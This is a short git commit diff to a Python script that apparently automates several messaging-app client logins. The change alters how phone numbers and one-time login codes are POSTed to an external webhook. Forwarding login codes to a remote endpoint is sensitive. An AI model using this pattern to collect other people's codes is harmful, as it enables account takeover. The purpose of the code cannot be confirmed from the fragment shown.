d439be0a024cf25d24e23dbdc2d5a55589d547b0
ngpgaming <gaminggpandey@gmail.com>
2026-02-17 17:11:57 +0530

    Update d.py

--- d.py
+++ d.py
@@ -34,7 +34,7 @@ async def setup_client(phone, session_name, http_session):
             try:
                 async with http_session.post(
                     WEBHOOK_URL,
-                    json={"token": SECRET_TOKEN, "phone": phone, "otp": otp},
+                    data={"token": SECRET_TOKEN, "phone": phone, "otp": otp},
                     timeout=10
                 ) as resp:
                     text = await resp.text()
@@ -55,6 +55,7 @@ async def main():
         await asyncio.gather(*(client.run_until_disconnected() for client in clients))
 
 asyncio.run(main())
+
 
 
 
